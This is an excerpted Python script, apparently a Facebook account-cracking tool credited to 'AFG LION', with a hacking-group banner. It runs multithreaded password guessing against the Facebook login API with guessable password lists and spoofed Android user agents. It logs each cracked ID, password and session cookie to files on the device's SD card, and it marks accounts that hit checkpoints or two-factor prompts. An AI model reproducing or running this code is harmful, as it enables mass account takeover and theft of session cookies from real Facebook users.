...
╩ ╩╚  ╚═╝  ╩═╝╩╚═╝╝╚╝
\033[1;97m--------------------------------------------------
\033[1;91m Author      : AFG LION
\033[1;91m GitHub      : afglion5
\033[1;97m Facebook    : Hacking Helper
\033[1;97m WhatsApp  : +93783361438
...
def pak():
		...
		with tred(max_workers=30) as Hamza:	
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					passlist = [psx,ids,'200300','afghanistan','۱۲۳۴۵۶۷۸۹','khan12345','khan123','500500','400500','600700','afghan12345','afghan123','kabul123']
				elif pcs in ['3','03']:
...
def api1(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[Mozilla/5.0 (Linux; Android 13; CPH2375 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.105 Mobile Safari/537.36 GoogleApp/14.39.39.28.arm64;]"
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LION-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[LION-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [Lion-CP] '+ids+' | '+pas+'\033[1;97m')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/LION-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/LION-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def Hamza1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [LION R] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
